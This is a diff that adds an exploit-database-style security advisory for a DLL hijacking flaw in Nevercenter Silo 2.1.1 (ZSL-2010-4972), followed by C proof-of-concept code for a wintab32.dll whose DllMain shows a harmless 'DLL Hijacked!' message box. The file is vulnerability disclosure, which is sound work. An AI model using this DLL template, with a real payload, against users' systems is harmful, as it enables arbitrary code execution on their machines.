@@ -1,0 +1,62 @@
+/*
+
+ Nevercenter Silo 2.1.1 Insecure Library Loading Vulnerability
+
+
+ Vendor: Nevercenter Ltd. Co.
+ Product web page: http://www.nevercenter.com
+ Affected version: 2.1.1
+
+ Summary: Silo 2 is a focused 3D modeling application with the
+ ability to effortlessly switch between organically sculpting
+ high-polygon models and precisely controlling hard-edged surfaces.
+ It can be used for anything from creating 3D characters for video
+ games and movies to quickly exploring 3D architectural ideas. Silo
+ is currently being used at top studios worldwide as both a stand-alone
+ design tool and as a versatile element of a multi-software 3D graphics
+ workflow. It is available for both Windows and Mac OS.
+
+ Desc: Silo 2 suffers from a DLL hijacking vulnerability, which could be
+ exploited by remote attackers to compromise a vulnerable system.
+ This issue is caused due to the application insecurely loading certain
+ librairies ("wintab32.dll") from the current working directory, which
+ could allow attackers to execute arbitrary code by tricking a user into
+ opening an audio file (.sib) from a network share.
+
+ Tested on: Microsoft Windows XP Professional SP3 (EN)
+
+ Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+ liquidworm gmail com
+
+ Zero Science Lab - http://www.zeroscience.mk
+
+ Advisory ID: ZSL-2010-4972
+ Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4972.php
+
+ 07.11.2010
+
+*/
+
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		dll_mll();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+
+	return TRUE;
+}
+
+int dll_mll()
+{
+	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
+}
